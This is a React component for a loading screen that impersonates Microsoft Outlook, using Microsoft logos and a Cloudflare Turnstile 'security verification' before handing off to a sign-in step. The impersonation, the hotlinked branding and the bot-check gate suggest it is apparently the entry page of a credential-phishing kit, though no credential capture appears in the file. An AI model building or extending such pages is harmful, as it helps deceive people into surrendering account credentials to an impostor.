import React, { useState, useEffect, useRef } from 'react';

interface InitialLoadingPageProps {
  onComplete: () => void;
}

export function InitialLoadingPage({ onComplete }: InitialLoadingPageProps) {
  const [turnstileToken, setTurnstileToken] = useState('');
  const [turnstileLoaded, setTurnstileLoaded] = useState(false);
  const [loadingProgress, setLoadingProgress] = useState(0);
  const [showTurnstile, setShowTurnstile] = useState(false);
  const [debugInfo, setDebugInfo] = useState('Initializing...');
  const turnstileRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    console.log('InitialLoadingPage mounted');
    setDebugInfo('Starting initial loading...');
    
    // Start initial loading animation
    const progressTimer = setInterval(() => {
      setLoadingProgress(prev => {
        if (prev >= 70) {
          clearInterval(progressTimer);
          // Show Turnstile when we reach 70%
          setDebugInfo('Loading security verification...');
          setShowTurnstile(true);
          initializeTurnstile();
          return 70;
        }
        return prev + Math.random() * 8;
      });
    }, 200);

    // Fallback: if nothing happens in 15 seconds, proceed anyway
    const emergencyFallback = setTimeout(() => {
      console.warn('Emergency fallback triggered - proceeding to login');
      setDebugInfo('Proceeding to login...');
      onComplete();
    }, 15000);

    return () => {
      clearInterval(progressTimer);
      clearTimeout(emergencyFallback);
    };
  }, []);

  const initializeTurnstile = () => {
    console.log('Initializing Turnstile...');
    setDebugInfo('Initializing security check...');
    
    const initTurnstile = () => {
      if ((window as any).turnstile && turnstileRef.current) {
        console.log('Turnstile found, rendering widget...');
        setDebugInfo('Rendering security widget...');
        try {
          (window as any).turnstile.render(turnstileRef.current, {
            sitekey: '0x4AAAAAABaeDHdwHVmJobfE',
            callback: (token: string) => {
              console.log('Turnstile completed successfully');
              setDebugInfo('Security verification completed!');
              setTurnstileToken(token);
              completeLoading();
            },
            'error-callback': () => {
              console.warn('Turnstile error, using fallback');
              setDebugInfo('Security check failed, proceeding anyway...');
              setTurnstileToken('');
              completeLoading();
            },
            theme: 'light',
            size: 'normal'
          });
          setTurnstileLoaded(true);
          setDebugInfo('Security widget loaded');
        } catch (error) {
          console.error('Turnstile render error:', error);
          setDebugInfo('Security widget error, proceeding...');
          setTurnstileLoaded(true);
          setTurnstileToken('fallback-token');
          completeLoading();
        }
      }
    };

    // Check if Turnstile is already loaded
    if ((window as any).turnstile) {
      console.log('Turnstile already available');
      initTurnstile();
    } else {
      console.log('Waiting for Turnstile to load...');
      setDebugInfo('Loading security components...');
      // Wait for Turnstile to load
      const checkTurnstile = setInterval(() => {
        if ((window as any).turnstile) {
          console.log('Turnstile became available');
          initTurnstile();
          clearInterval(checkTurnstile);
        }
      }, 100);

      // Fallback: if Turnstile doesn't load within 10 seconds, allow proceeding
      const fallbackTimer = setTimeout(() => {
        if (!turnstileLoaded) {
          console.warn('Turnstile failed to load, using fallback');
          setDebugInfo('Security check unavailable, proceeding...');
          setTurnstileLoaded(true);
          setTurnstileToken('fallback-token');
          completeLoading();
        }
        clearInterval(checkTurnstile);
      }, 10000);

      return () => {
        clearInterval(checkTurnstile);
        clearTimeout(fallbackTimer);
      };
    }
  };

  const completeLoading = () => {
    console.log('Completing loading sequence...');
    setDebugInfo('Finalizing...');
    // Complete the loading animation after Turnstile
    const finalTimer = setInterval(() => {
      setLoadingProgress(prev => {
        if (prev >= 100) {
          clearInterval(finalTimer);
          // Wait a moment then proceed to login
          setTimeout(() => {
            console.log('Proceeding to login page');
            setDebugInfo('Ready! Loading login...');
            onComplete();
          }, 800);
          return 100;
        }
        return prev + Math.random() * 12;
      });
    }, 150);
  };

  // Skip button for debugging/testing
  const handleSkip = () => {
    console.log('Skip button clicked');
    onComplete();
  };
  return (
    <div className="min-h-screen flex flex-col" style={{ backgroundColor: '#f5f5f5' }}>
      {/* Main Content */}
      <div className="flex-1 flex flex-col items-center justify-center px-6">
        {/* Outlook Mail Icon */}
        <div className="mb-8">
          <img 
            src="https://sp-ao.shortpixel.ai/client/to_auto,q_glossy,ret_img,w_1200,h_675/https://www.crushbank.com/wp-content/uploads/2023/03/Microsoft_Outlook-Logo.wine_-1200x675.png"
            alt="Outlook"
            className="w-56 h-32 rounded-lg"
          />
        </div>

        {/* Loading Text */}
        <div className="text-center mb-8">
          <h1 className="text-2xl font-light text-gray-800 mb-2">
            Microsoft Outlook
          </h1>
          <p className="text-sm text-gray-600 mb-4">
            Loading your experience...
          </p>
          
          {/* Progress Bar */}
          <div className="w-80 max-w-full mx-auto">
            <div className="bg-gray-200 rounded-full h-1 mb-4">
              <div 
                className="bg-blue-600 h-1 rounded-full transition-all duration-300 ease-out"
                style={{ width: `${loadingProgress}%` }}
              ></div>
            </div>
            <p className="text-xs text-gray-500">
              {debugInfo}
            </p>
          </div>
        </div>

        {/* Turnstile Widget */}
        {showTurnstile && turnstileLoaded && !turnstileToken && (
          <div className="mb-8">
            <div className="text-center mb-4">
              <p className="text-sm text-gray-600 mb-2">
                Please complete the security verification to continue
              </p>
            </div>
            <div ref={turnstileRef}></div>
          </div>
        )}

        {/* Loading Indicator */}
        {showTurnstile && !turnstileLoaded && (
          <div className="flex items-center space-x-2 text-sm text-gray-500 mb-8">
            <div className="w-4 h-4 border-2 border-gray-300 border-t-blue-600 rounded-full animate-spin"></div>
            <span>Loading security verification...</span>
          </div>
        )}

        {/* Success State */}
        {turnstileToken && loadingProgress >= 100 && (
          <div className="flex items-center space-x-2 text-sm text-green-600">
            <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
            </svg>
            <span>Verified! Loading sign-in...</span>
          </div>
        )}

        {/* Debug Skip Button (remove in production) */}
      </div>

      {/* Footer */}
      <div className="py-6">
        <div className="flex justify-center">
          <img 
            className="h-6 w-auto" 
            src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" 
            alt="Microsoft" 
          />
        </div>
      </div>
    </div>
  );
}